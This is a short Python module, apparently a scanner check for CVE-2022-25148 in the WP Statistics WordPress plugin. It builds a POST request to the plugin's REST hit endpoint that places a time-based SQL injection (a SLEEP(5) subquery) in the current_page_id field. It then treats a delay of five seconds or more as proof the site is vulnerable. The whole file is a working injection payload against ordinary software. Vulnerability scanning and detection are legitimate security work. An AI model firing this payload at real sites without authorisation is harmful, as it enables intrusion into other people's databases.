"""
WP Statistics <= 13.1.5 (CVE-2022-25148) - Time-based SQL Injection
Description: SQL injection in current_page_id parameter of WP-JSON REST endpoint
Severity: High
CVSS Score: 7.5
Affected Versions: WP Statistics <= 13.1.5
Reference: https://www.exploit-db.com/exploits/51711
"""

def get_payload():
    return {
        'path': '/wp-json/wp-statistics/v1/hit',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json'
        },
        'data': {
            'current_page_id': "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
        }
    }

def check_response(response):
    return response.elapsed.total_seconds() >= 5 